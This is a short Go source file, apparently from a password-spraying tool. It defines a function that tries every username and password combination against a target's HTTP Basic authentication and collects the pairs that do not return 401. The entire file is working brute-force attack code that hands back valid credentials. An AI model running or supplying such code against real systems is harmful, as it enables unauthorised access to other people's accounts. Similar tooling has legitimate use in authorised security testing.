package main

import (
	"encoding/base64"
	"fmt"
	"net/http"
	"strconv"
	"sync"
)



func basicSpray(wg *sync.WaitGroup, channelToCommunicate chan string,  taskToRun task) {
	defer wg.Done()
	for _,username := range taskToRun.usernames {
		for _,password := range taskToRun.passwords {
			headerValue := base64.StdEncoding.EncodeToString([]byte(username+":"+password))
			client := &http.Client{}
			req, _ := http.NewRequest("GET", taskToRun.target.scheme+"://"+taskToRun.target.host+":"+strconv.Itoa(taskToRun.target.port)+"/"+taskToRun.target.url, nil)
			req.Header.Set("Authorization", "Basic "+headerValue)
			res, _ := client.Do(req)
			if res.StatusCode == 401 {
				fmt.Print("-")
			} else {
				fmt.Print("+")
				channelToCommunicate <- username+":"+password
			}

		}
	}


}